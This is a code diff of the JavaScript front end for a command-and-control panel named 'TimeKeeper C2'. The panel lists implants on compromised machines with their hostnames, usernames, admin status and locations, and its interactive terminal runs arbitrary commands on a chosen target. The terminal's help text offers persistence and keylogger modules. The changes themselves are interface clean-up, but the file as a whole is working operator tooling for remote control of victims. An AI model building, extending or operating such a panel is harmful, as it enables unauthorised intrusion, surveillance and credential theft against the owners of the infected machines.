@@ -1,45 +1,9 @@
-// Função para permitir arrastar o mapa SVG
-function enableSVGPan(svgId) {
-    const svg = document.getElementById(svgId);
-    if (!svg) return;
-    let isDragging = false;
-    let startX, startY;
-    let initialViewBox;
 
-    svg.addEventListener('mousedown', function(e) {
-        isDragging = true;
-        startX = e.clientX;
-        startY = e.clientY;
-        initialViewBox = svg.viewBox.baseVal ? {
-            x: svg.viewBox.baseVal.x,
-            y: svg.viewBox.baseVal.y,
-            w: svg.viewBox.baseVal.width,
-            h: svg.viewBox.baseVal.height
-        } : { x: 0, y: 0, w: svg.width.baseVal.value, h: svg.height.baseVal.value };
-        svg.style.cursor = 'grab';
-    });
-
-    window.addEventListener('mousemove', function(e) {
-        if (!isDragging) return;
-        const dx = (e.clientX - startX) * (initialViewBox.w / svg.clientWidth);
-        const dy = (e.clientY - startY) * (initialViewBox.h / svg.clientHeight);
-        svg.viewBox.baseVal.x = initialViewBox.x - dx;
-        svg.viewBox.baseVal.y = initialViewBox.y - dy;
-    });
-
-    window.addEventListener('mouseup', function() {
-        if (isDragging) {
-            isDragging = false;
-            svg.style.cursor = 'default';
-        }
-    });
-}
 
 // Global variables
 let authToken = localStorage.getItem('authToken');
-let currentImplantToken = null;
 let worldMap = null;
-let mapMarkers = new Map(); // Use Map to track markers by token
+let mapMarkers = new Map();
 let mapInitialized = false;
 
 // Terminal Variables
@@ -52,13 +16,9 @@ const loginScreen = document.getElementById('loginScreen');
 const dashboard = document.getElementById('dashboard');
 const loginForm = document.getElementById('loginForm');
 const loginError = document.getElementById('loginError');
-
+ 
 // Initialize app - Consolidated DOMContentLoaded
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM Content Loaded - Initializing app...');
-    
-    // Enable SVG pan
-    enableSVGPan('worldMapSVG');
     
     // Initialize authentication
     if (authToken) {
@@ -70,11 +30,14 @@ document.addEventListener('DOMContentLoaded', function() {
     // Initialize terminal input handler
     const terminalInput = document.getElementById('terminalInput');
     if (terminalInput) {
-        console.log('Terminal input found, adding event listeners...');
         terminalInput.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                console.log('Enter key pressed, executing command...');
                 executeTerminalCommand();
+                // Ensure input stays visible after command execution
+                setTimeout(() => {
+                    terminalInput.focus();
+                    terminalInput.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                }, 100);
             } else if (e.key === 'ArrowUp') {
                 e.preventDefault();
                 if (historyIndex < terminalHistory.length - 1) {
@@ -93,13 +56,12 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     } else {
-        console.log('Terminal input not found!');
+        // Terminal input not found
     }
     
     // Initialize target selector
     const targetSelect = document.getElementById('targetSelect');
     if (targetSelect) {
-        console.log('Target select found, adding event listener...');
         targetSelect.addEventListener('change', function(e) {
             const selectedValue = e.target.value;
             if (selectedValue) {
@@ -110,7 +72,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     } else {
-        console.log('Target select not found!');
+        // Target select not found
     }
 });
 
@@ -223,6 +185,17 @@ async function loadImplants() {
     }
 }
 
+// Global function for sidebar refresh button
+async function refreshImplants() {
+    console.log('Refreshing implants...');
+    await loadImplants();
+}
+
+// Global function for settings
+function showSettings() {
+    alert('Settings panel - Coming soon!');
+}
+
 function updateStatistics(implants) {
     const total = implants.length;
     const online = implants.filter(i => isOnline(i.last_seen)).length;
@@ -233,13 +206,21 @@ function updateStatistics(implants) {
     document.getElementById('onlineImplants').textContent = online;
     document.getElementById('offlineImplants').textContent = offline;
     document.getElementById('adminImplants').textContent = admin;
+    
+    // Store implants data globally for dashboard
+    window.lastImplantsData = implants;
+    
+    // Update dashboard if function exists
+    if (typeof updateDashboardData === 'function') {
+        updateDashboardData(implants);
+    }
 }
 
 function renderImplantsTable(implants) {
     const tbody = document.getElementById('implantsTableBody');
     tbody.innerHTML = '';
     
-    implants.forEach(implant => {
+    implants.forEach((implant, index) => {    
         const row = document.createElement('tr');
         const isOnlineStatus = isOnline(implant.last_seen);
         
@@ -262,16 +243,10 @@ function renderImplantsTable(implants) {
             </td>
             <td>${formatDateTime(implant.last_seen)}</td>
             <td>
-                <button class="btn btn-primary btn-sm me-1" 
-                        onclick="selectTarget('${implant.token}', '${implant.hostname}', '${implant.username}')"
-                        ${!isOnlineStatus ? 'disabled' : ''}
-                        title="Select as Terminal Target">
-                    📡
-                </button>
                 <button class="btn btn-danger btn-sm" 
                         onclick="deleteImplant('${implant.token}', '${implant.hostname}')"
                         title="Delete Implant">
-                    🗑️
+                    <i class="fas fa-times"></i>
                 </button>
             </td>
         `;
@@ -281,62 +256,12 @@ function renderImplantsTable(implants) {
     
     // Update terminal target selector
     populateTargetSelect(implants);
-    
-    // Auto-select first online implant for testing (optional)
-    const onlineImplants = implants.filter(implant => isOnline(implant.last_seen));
-    if (onlineImplants.length > 0 && !currentTerminalTarget) {
-        console.log('Auto-selecting first online implant for testing');
-        const firstImplant = onlineImplants[0];
-        // Uncomment the line below to auto-select first target
-        // selectTarget(firstImplant.token, firstImplant.hostname, firstImplant.username);
-    }
 }
 
-// Map initialization - Google Maps callback function
-function initMap() {
-    worldMap = new google.maps.Map(document.getElementById('worldMap'), {
-        center: { lat: 20, lng: 0 },
-        zoom: 2,
-        minZoom: 2,
-        maxZoom: 10,
-        mapTypeId: 'roadmap',
-        styles: [
-            {
-                featureType: 'water',
-                elementType: 'geometry',
-                stylers: [{ color: '#e9e9e9' }, { lightness: 17 }]
-            },
-            {
-                featureType: 'landscape',
-                elementType: 'geometry',
-                stylers: [{ color: '#f5f5f5' }, { lightness: 20 }]
-            }
-        ]
-    });
-    
-    mapInitialized = true;
-    console.log('Google Maps initialized');
-    
-    // Load implants if we have auth token
-    if (authToken && dashboard.style.display !== 'none') {
-        loadImplants();
-    }
-}
-
-// Fallback initialization function
-function initializeMap() {
-    // This function is kept for compatibility but Google Maps will be initialized via callback
-    if (!mapInitialized) {
-        console.log('Waiting for Google Maps to load...');
-        setTimeout(initializeMap, 1000);
-    }
-}
 
 // World map functions
 function updateWorldMap(implants) {
-    console.log('updateWorldMap called with implants:', implants);
     if (!worldMap || !mapInitialized) {
-        console.log('Google Maps not initialized yet');
         return;
     }
 
@@ -348,9 +273,7 @@ function updateWorldMap(implants) {
 
     // Add markers for each implant
     implants.forEach(implant => {
-        console.log('Processing implant:', implant.hostname, 'Location:', implant.geo_location);
         const coordinates = getLocationCoordinates(implant.geo_location);
-        console.log('Coordinates for', implant.geo_location, ':', coordinates);
         if (coordinates && coordinates.lat && coordinates.lng) {
             createGoogleMapsMarker(implant, coordinates);
             console.log('Marker created for:', implant.hostname);
@@ -422,22 +345,7 @@ function createGoogleMapsMarker(implant, coordinates) {
     return marker;
 }
 
-function createPopupContent(implant, isOnlineStatus) {
-    return `
-        <div>
-            <strong>${implant.hostname}</strong><br>
-            <small>User: ${implant.username}</small><br>
-            <small>OS: ${implant.operating_system}</small><br>
-            <small>Location: ${implant.geo_location}</small><br>
-            <small>Status: <span style="color: ${isOnlineStatus ? '#28a745' : '#dc3545'}">${isOnlineStatus ? 'Online' : 'Offline'}</span></small><br>
-            <small>Admin: ${implant.is_local_admin ? 'Yes' : 'No'}</small><br>
-            <div style="margin-top: 8px;">
-                <button class="popup-button" onclick="selectTarget('${implant.token}', '${implant.hostname}', '${implant.username}')" ${!isOnlineStatus ? 'disabled' : ''}>Select</button>
-                <button class="popup-button" onclick="viewLastResult('${implant.token}')">Results</button>
-            </div>
-        </div>
-    `;
-}
+
 
 
 // World map functions (old code to remove)
@@ -508,16 +416,7 @@ function refreshImplants() {
     });
 }
 
-// Command execution functions (legacy - replaced by terminal)
-function setCommand(command) {
-    // This function is no longer used
-    console.log('Legacy setCommand called:', command);
-}
 
-async function executeCommand() {
-    // This function is no longer used
-    console.log('Legacy executeCommand called');
-}
 
 async function viewLastResult(token) {
     try {
@@ -592,7 +491,6 @@ function showToast(message, type = 'info') {
 
 // Terminal Functions
 function populateTargetSelect(implants) {
-    console.log('Populating target select with implants:', implants);
     const targetSelect = document.getElementById('targetSelect');
     if (!targetSelect) {
         console.error('Target select element not found!');
@@ -616,23 +514,18 @@ function populateTargetSelect(implants) {
         }
         
         targetSelect.appendChild(option);
-        console.log('Added option:', option.textContent, 'Online:', isOnlineStatus);
     });
     
     const onlineCount = implants.filter(implant => isOnline(implant.last_seen)).length;
-    console.log('Target select populated with', implants.length, 'total implants,', onlineCount, 'online');
 }
 
 function selectTarget(token, hostname, username) {
-    console.log('Selecting target:', { token, hostname, username });
     
     currentTerminalTarget = {
         token: token,
         hostname: hostname,
         username: username
     };
-    
-    console.log('Current terminal target set:', currentTerminalTarget);
     
     // Update terminal UI
     const statusElement = document.getElementById('terminalStatus');
@@ -661,8 +554,6 @@ function selectTarget(token, hostname, username) {
     // Add connection message to terminal
     addToTerminal(`Connected to ${username}@${hostname}`, 'info');
     addToTerminal('Type \'help\' for available commands', 'info');
-    
-    console.log('Target selection completed');
 }
 
 function disconnectTarget() {
@@ -688,7 +579,7 @@ function clearTerminal() {
     const terminalOutput = document.getElementById('terminalOutput');
     terminalOutput.innerHTML = `
         <div class="terminal-welcome">
-            TimeKeeper C2 Interactive Terminal v1.0<br>
+            TimeKeeper <br>
             Type 'help' for available commands<br>
             Select a target to begin...<br><br>
         </div>
@@ -696,7 +587,6 @@ function clearTerminal() {
 }
 
 function testConnection() {
-    console.log('Test connection button clicked');
     addToTerminal('Testing terminal functionality...', 'info');
     
     // Try to select first available target (online or offline for testing)
@@ -715,19 +605,11 @@ function testConnection() {
             targetSelect.value = selectedOption.value;
             const [token, hostname, username] = selectedOption.value.split('|');
             selectTarget(token, hostname, username);
-            addToTerminal('Auto-selected first available online target', 'info');
         } else {
-            // For testing, allow connection to offline targets
-            addToTerminal('No online targets found. Selecting first target for testing...', 'warning');
-            const firstOption = targetSelect.options[1];
-            targetSelect.value = firstOption.value;
-            const [token, hostname, username] = firstOption.value.split('|');
-            selectTarget(token, hostname, username);
-            addToTerminal('Connected to offline target for testing', 'warning');
+            addToTerminal('No online targets available', 'warning');
         }
     } else {
-        addToTerminal('No targets available. Make sure you have implants loaded.', 'error');
-        addToTerminal('Try refreshing the implants list.', 'info');
+        addToTerminal('No targets available', 'error');
     }
 }
 
@@ -750,8 +632,34 @@ function addToTerminal(text, type = 'output') {
     }
     
     terminalOutput.appendChild(outputDiv);
-    terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    
+    // Simple scroll to bottom
+    setTimeout(() => {
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    }, 10);
+    
     console.log('Successfully added to terminal');
+}
+
+function addTerminalSpacer() {
+    const terminalOutput = document.getElementById('terminalOutput');
+    if (!terminalOutput) return;
+    
+    // Remove any existing spacers first
+    const existingSpacers = terminalOutput.querySelectorAll('.terminal-spacer');
+    existingSpacers.forEach(spacer => spacer.remove());
+    
+    // Add single spacer
+    const spacer = document.createElement('div');
+    spacer.style.height = '2rem';
+    spacer.style.width = '100%';
+    spacer.classList.add('terminal-spacer');
+    terminalOutput.appendChild(spacer);
+    
+    // Scroll to bottom
+    setTimeout(() => {
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    }, 10);
 }
 
 async function executeTerminalCommand() {
@@ -795,6 +703,9 @@ async function executeTerminalCommand() {
         addToTerminal('  persistence   - Start persistence module', 'info');
         addToTerminal('  keylogger     - Start keylogger module', 'info');
         addToTerminal('  [any command] - Execute on target system', 'info');
+        
+        // Add single spacer after all help content
+        addTerminalSpacer();
         return;
     }
     
@@ -818,7 +729,6 @@ async function executeTerminalCommand() {
     
     // Execute remote command
     try {
-        addToTerminal('Executing...', 'info');
         
         const response = await apiRequest(`/implants/command/${currentTerminalTarget.token}?command=${encodeURIComponent(command)}`, {
             method: 'POST'
@@ -840,21 +750,26 @@ async function executeTerminalCommand() {
                         } else {
                             addToTerminal('Command executed successfully (no output)', 'info');
                         }
+                        addTerminalSpacer();
                     } else {
                         addToTerminal('Failed to retrieve command output', 'error');
+                        addTerminalSpacer();
                     }
                 } catch (error) {
                     console.error('Error retrieving output:', error);
                     addToTerminal(`Error retrieving output: ${error.message}`, 'error');
+                    addTerminalSpacer();
                 }
             }, 2000);
         } else {
             const error = await response.json();
             console.error('Command execution failed:', error);
             addToTerminal(`Failed to execute command: ${error.detail || 'Unknown error'}`, 'error');
+            addTerminalSpacer();
         }
     } catch (error) {
         console.error('Error executing command:', error);
         addToTerminal(`Error: ${error.message}`, 'error');
+        addTerminalSpacer();
     }
 }
